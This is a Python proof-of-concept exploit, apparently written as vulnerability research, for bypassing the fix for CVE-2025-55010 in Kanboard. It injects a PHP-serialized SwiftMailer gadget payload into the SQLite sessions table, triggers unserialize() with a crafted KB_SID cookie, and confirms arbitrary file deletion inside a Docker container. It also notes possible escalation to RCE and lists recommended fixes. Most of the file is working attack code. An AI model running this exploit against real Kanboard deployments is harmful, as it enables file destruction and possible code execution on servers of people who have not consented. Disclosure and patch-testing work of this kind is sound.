#!/usr/bin/env python3
"""
CVE-2025-55010 Bypass PoC — Session Table Deserialization

BYPASS TECHNIQUE:
    The fix for CVE-2025-55010 patches ProjectActivityEventFormatter::unserializeEvent()
    to return [] instead of calling unserialize(). However, Kanboard uses database-backed
    PHP sessions by default (SESSION_HANDLER='db'). PHP's session_start() internally calls
    unserialize() on data from the `sessions` table WITHOUT allowed_classes restrictions.

    An admin who can download/upload the SQLite database can inject a malicious
    PHP-serialized payload into the `sessions` table. When ANY request is sent with
    the crafted session cookie (KB_SID=<injected_id>), PHP's session_start() deserializes
    the malicious payload, instantiating arbitrary objects and triggering gadget chains.

PROOF APPROACH:
    1. Extract database from patched container
    2. Generate TemporaryFileByteStream gadget payload (file deletion via __destruct)
    3. Create marker file in container
    4. Inject malicious session row into sessions table
    5. Replace database in container
    6. Send HTTP request with crafted session cookie
    7. Verify marker file was deleted (proves arbitrary object deserialization)

    This bypass uses the SAME prerequisite (admin DB access) and the SAME gadget chain
    library (SwiftMailer) but through an UNPATCHED deserialization sink.
"""

import sys
import os
import json
import gzip
import sqlite3
import tempfile
import base64
import subprocess
import re
import time
import http.client
import urllib.parse
from html.parser import HTMLParser

CONTAINER_NAME = "cve-2025-55010-patched"
MARKER_FILE = "/tmp/bypass_marker.txt"
MARKER_CONTENT = "CVE-2025-55010-SESSION-BYPASS-PROOF"
CRAFTED_SESSION_ID = "bypass_" + os.urandom(12).hex()
SESSION_EXPIRE = int(time.time()) + 86400


def docker_exec(container_name, cmd, timeout=30):
    """Execute a command inside the Docker container."""
    if isinstance(cmd, str):
        full_cmd = ["docker", "exec", container_name, "sh", "-c", cmd]
    else:
        full_cmd = ["docker", "exec", container_name] + cmd
    result = subprocess.run(full_cmd, capture_output=True, timeout=timeout)
    return result


def get_container_ip(container_name):
    """Get container IP address."""
    result = subprocess.run(
        ["docker", "inspect", container_name, "--format",
         "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"],
        capture_output=True, text=True
    )
    return result.stdout.strip()


class KanboardBypass:
    """Bypass exploit using session table deserialization."""

    def __init__(self, host, port=80):
        self.host = host
        self.port = port
        self.session_cookie = None
        self.csrf_token = None

    def _http_request(self, method, path, body=None, headers=None, content_type=None):
        """Make HTTP request, return (status, headers_dict, body_bytes)."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        try:
            hdrs = headers or {}
            if self.session_cookie:
                hdrs['Cookie'] = self.session_cookie
            if content_type:
                hdrs['Content-Type'] = content_type
            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            resp_body = resp.read()
            for hname, hval in resp.getheaders():
                if hname.lower() == 'set-cookie':
                    m = re.match(r'(KB_SID=[^;]+)', hval)
                    if m:
                        self.session_cookie = m.group(1)
            return resp.status, dict(resp.getheaders()), resp_body
        finally:
            conn.close()

    def _extract_csrf(self, html):
        """Extract CSRF token from HTML."""
        if isinstance(html, bytes):
            html = html.decode('utf-8', errors='replace')
        m = re.search(r'csrf_token["\s]*(?:value="|=)([a-f0-9]{40,})', html)
        if m:
            self.csrf_token = m.group(1)
            return self.csrf_token
        return None

    def send_request_with_session(self, session_id):
        """Send HTTP request using a specific session ID to trigger deserialization."""
        conn = http.client.HTTPConnection(self.host, self.port, timeout=30)
        try:
            conn.request("GET", "/login", headers={"Cookie": f"KB_SID={session_id}"})
            resp = conn.getresponse()
            body = resp.read()
            return resp.status, body
        finally:
            conn.close()


def main():
    print("=" * 72)
    print("CVE-2025-55010 BYPASS PoC: Session Table Deserialization")
    print("Bypass: PHP session_start() unserialize() via sessions table")
    print("=" * 72)

    # Determine target
    if len(sys.argv) >= 2:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) >= 3 else 80
    else:
        host = get_container_ip(CONTAINER_NAME)
        port = 80

    if not host:
        print(f"[-] Could not determine target IP for {CONTAINER_NAME}")
        sys.exit(1)

    print(f"[*] Target: http://{host}:{port} ({CONTAINER_NAME})")
    exploit = KanboardBypass(host, port)

    # ===================================================================
    # Step 0: Verify patched version
    # ===================================================================
    print("\n[*] Step 0: Verifying target is the PATCHED version...")
    r = docker_exec(CONTAINER_NAME, "cat /var/www/app/app/version.txt")
    version = r.stdout.decode().strip()
    print(f"    Kanboard version: {version}")

    r = docker_exec(CONTAINER_NAME,
        "grep -c 'return unserialize' /var/www/app/app/Formatter/ProjectActivityEventFormatter.php")
    unserialize_count = r.stdout.decode().strip()
    if unserialize_count == "0":
        print("    [+] CONFIRMED: unserialize() REMOVED from ProjectActivityEventFormatter (fix applied)")
    else:
        print("    [!] WARNING: unserialize() still present — may not be patched!")

    r = docker_exec(CONTAINER_NAME,
        "grep SESSION_HANDLER /var/www/app/app/constants.php")
    print(f"    Session handler config: {r.stdout.decode().strip()}")
    print(f"    [+] SESSION_HANDLER defaults to 'db' — database-backed sessions ACTIVE")

    # ===================================================================
    # Step 1: Create marker file
    # ===================================================================
    print(f"\n[*] Step 1: Creating marker file inside container...")
    docker_exec(CONTAINER_NAME, f"echo '{MARKER_CONTENT}' > {MARKER_FILE}")
    docker_exec(CONTAINER_NAME, f"chmod 666 {MARKER_FILE}")
    r = docker_exec(CONTAINER_NAME, f"cat {MARKER_FILE}")
    if MARKER_CONTENT in r.stdout.decode():
        print(f"    [+] Marker file created: {MARKER_FILE}")
    else:
        print(f"    [-] FAILED to create marker file!")
        sys.exit(1)

    # ===================================================================
    # Step 2: Generate malicious session payload inside the container
    # ===================================================================
    print(f"\n[*] Step 2: Generating malicious session payload...")

    # Copy payload generator into container
    poc_dir = os.path.dirname(os.path.abspath(__file__))
    generator_path = os.path.join(poc_dir, "generate_session_payload.php")
    subprocess.run([
        "docker", "cp",
        generator_path,
        f"{CONTAINER_NAME}:/tmp/generate_session_payload.php"
    ], capture_output=True)

    r = docker_exec(CONTAINER_NAME,
        ["php", "/tmp/generate_session_payload.php", "filedelete"])

    if r.returncode != 0:
        print(f"    [-] Payload generation failed!")
        print(f"    stderr: {r.stderr.decode()}")
        sys.exit(1)

    session_payload = r.stdout  # Raw bytes of the session data
    session_payload_str = session_payload.decode('latin-1')  # Preserve raw bytes
    print(f"    [+] Payload generated ({len(session_payload)} bytes)")
    print(f"    [+] Payload info: {r.stderr.decode().strip()}")

    if b"Swift_ByteStream" in session_payload and b"|" in session_payload:
        print(f"    [+] Payload validated: contains SwiftMailer object in PHP session format")
    else:
        print(f"    [-] Unexpected payload format!")
        print(f"    First 200 bytes: {session_payload[:200]}")

    # ===================================================================
    # Step 3: Extract database from container, inject session, restore
    # ===================================================================
    print(f"\n[*] Step 3: Injecting malicious session into database...")
    print(f"    Crafted session ID: {CRAFTED_SESSION_ID}")

    # Extract the database file from the container
    with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp:
        tmp_db = tmp.name

    subprocess.run([
        "docker", "cp",
        f"{CONTAINER_NAME}:/var/www/app/data/db.sqlite",
        tmp_db
    ], capture_output=True, check=True)

    db_size = os.path.getsize(tmp_db)
    print(f"    [+] Extracted database ({db_size} bytes)")

    # Modify the database: inject session row
    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()

    # Check sessions table
    cursor.execute("SELECT sql FROM sqlite_master WHERE name='sessions'")
    schema = cursor.fetchone()
    print(f"    Sessions table: {'EXISTS' if schema else 'MISSING'}")

    if schema:
        print(f"    Schema: {schema[0]}")

    # Count existing sessions
    cursor.execute("SELECT COUNT(*) FROM sessions")
    count = cursor.fetchone()[0]
    print(f"    Existing sessions: {count}")

    # Insert malicious session (use binary data)
    cursor.execute(
        "INSERT OR REPLACE INTO sessions (id, expire_at, data) VALUES (?, ?, ?)",
        (CRAFTED_SESSION_ID, SESSION_EXPIRE, session_payload)
    )
    conn.commit()

    # Verify
    cursor.execute("SELECT id, expire_at, length(data) FROM sessions WHERE id=?",
                   (CRAFTED_SESSION_ID,))
    row = cursor.fetchone()
    print(f"    [+] Injected session: id={row[0]}, expires={row[1]}, data_len={row[2]}")
    conn.close()

    # Copy the modified database back
    subprocess.run([
        "docker", "cp",
        tmp_db,
        f"{CONTAINER_NAME}:/var/www/app/data/db.sqlite"
    ], capture_output=True, check=True)

    # Fix permissions
    docker_exec(CONTAINER_NAME, "chown nginx:nginx /var/www/app/data/db.sqlite")
    docker_exec(CONTAINER_NAME, "chmod 644 /var/www/app/data/db.sqlite")
    print(f"    [+] Modified database restored to container")

    os.unlink(tmp_db)

    # ===================================================================
    # Step 4: Trigger session deserialization
    # ===================================================================
    print(f"\n[*] Step 4: Triggering session deserialization...")
    print(f"    Sending request with Cookie: KB_SID={CRAFTED_SESSION_ID}")
    print(f"    PHP flow: session_start() -> SessionHandler::read() -> unserialize(data)")
    print(f"    This calls unserialize() on attacker-controlled data from sessions table")
    print(f"    The CVE-2025-55010 fix does NOT cover this code path!")

    # Send multiple requests to ensure session_start() processes our data
    for i, path in enumerate(["/login", "/", "/dashboard"], 1):
        status, body = exploit.send_request_with_session(CRAFTED_SESSION_ID)
        print(f"    Request {i} ({path}): status={status}")
        time.sleep(0.5)

    # ===================================================================
    # Step 5: Verify bypass
    # ===================================================================
    print(f"\n[*] Step 5: Verifying bypass (checking if marker file was deleted)...")
    time.sleep(1)

    r = docker_exec(CONTAINER_NAME,
        f"test -f {MARKER_FILE} && echo 'EXISTS' || echo 'DELETED'")
    status = r.stdout.decode().strip()

    print()
    print("=" * 72)
    print("BYPASS VERIFICATION RESULTS")
    print("=" * 72)

    if status == "DELETED":
        print(f"[+] ======= BYPASS SUCCESSFUL =======")
        print(f"[+] Marker file {MARKER_FILE} was DELETED!")
        print(f"[+]")
        print(f"[+] PROOF CHAIN:")
        print(f"[+]   1. Malicious PHP-serialized data injected into `sessions` table")
        print(f"[+]   2. HTTP request sent with crafted session cookie: KB_SID={CRAFTED_SESSION_ID[:30]}...")
        print(f"[+]   3. PHP session_start() -> SessionHandler::read() -> returned malicious data")
        print(f"[+]   4. PHP internally called unserialize() on the session data (NO allowed_classes!)")
        print(f"[+]   5. Swift_ByteStream_TemporaryFileByteStream object instantiated")
        print(f"[+]   6. __destruct() triggered -> unlink('{MARKER_FILE}') -> FILE DELETED")
        print(f"[+]")
        print(f"[+] BYPASS SIGNIFICANCE:")
        print(f"[+]   - The CVE-2025-55010 fix patches ProjectActivityEventFormatter::unserializeEvent()")
        print(f"[+]   - But Kanboard's database-backed session handler provides an UNPATCHED sink")
        print(f"[+]   - Same prerequisite: admin access + SQLite database upload")
        print(f"[+]   - Same gadget chain: SwiftMailer (bundled with Kanboard)")
        print(f"[+]   - Impact: arbitrary file deletion via __destruct()")
        print(f"[+]   - Potential escalation to RCE via alternative gadget chains")
        print(f"[+]")
        print(f"[+] RECOMMENDED FIX:")
        print(f"[+]   - Switch session handler from 'db' to 'php' (file-based)")
        print(f"[+]   - Or implement custom session serialization using json_encode/json_decode")
        print(f"[+]   - Or remove SwiftMailer gadget classes from the bundled libraries")
        return True

    else:
        print(f"[-] Marker file still exists — bypass did not succeed")
        print(f"[-] Additional diagnostics:")

        # Check if the session row is still in the DB
        r = docker_exec(CONTAINER_NAME,
            f"php -r \"\\$db = new PDO('sqlite:/var/www/app/data/db.sqlite'); "
            f"\\$r = \\$db->query(\\\"SELECT id, expire_at, length(data) as dlen FROM sessions WHERE id='{CRAFTED_SESSION_ID}'\\\"); "
            f"var_dump(\\$r->fetch(PDO::FETCH_ASSOC));\"")
        print(f"    Session row: {r.stdout.decode().strip()}")

        # Check PHP errors
        r = docker_exec(CONTAINER_NAME, "tail -30 /var/log/nginx/error.log 2>/dev/null")
        errors = r.stdout.decode().strip()
        if errors:
            print(f"    Recent errors:\n{errors}")

        # Check if session.use_strict_mode is rejecting our ID
        r = docker_exec(CONTAINER_NAME,
            "php -r \"echo ini_get('session.use_strict_mode');\"")
        print(f"    session.use_strict_mode (ini): {r.stdout.decode().strip()}")

        # Try to debug: run PHP code that simulates what session_start does
        print(f"\n[*] Debug: Testing session deserialization manually...")
        r = docker_exec(CONTAINER_NAME, [
            "php", "-r",
            f"""
$db = new PDO('sqlite:/var/www/app/data/db.sqlite');
$stmt = $db->prepare("SELECT data FROM sessions WHERE id = :id AND expire_at > :now");
$stmt->execute([':id' => '{CRAFTED_SESSION_ID}', ':now' => time()]);
$data = $stmt->fetchColumn();
echo "Data length: " . strlen($data) . "\\n";
echo "Data starts with: " . bin2hex(substr($data, 0, 20)) . "\\n";
echo "Data readable start: " . substr($data, 0, 80) . "\\n";
// Try to session_decode it
echo "Attempting session_decode()...\\n";
$result = session_decode($data);
echo "session_decode result: " . var_export($result, true) . "\\n";
echo "\\$_SESSION: " . var_export(\\$_SESSION ?? 'undefined', true) . "\\n";
"""
        ])
        print(f"    Debug output:\n{r.stdout.decode()}")
        if r.stderr.decode().strip():
            print(f"    Debug errors:\n{r.stderr.decode()}")

        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
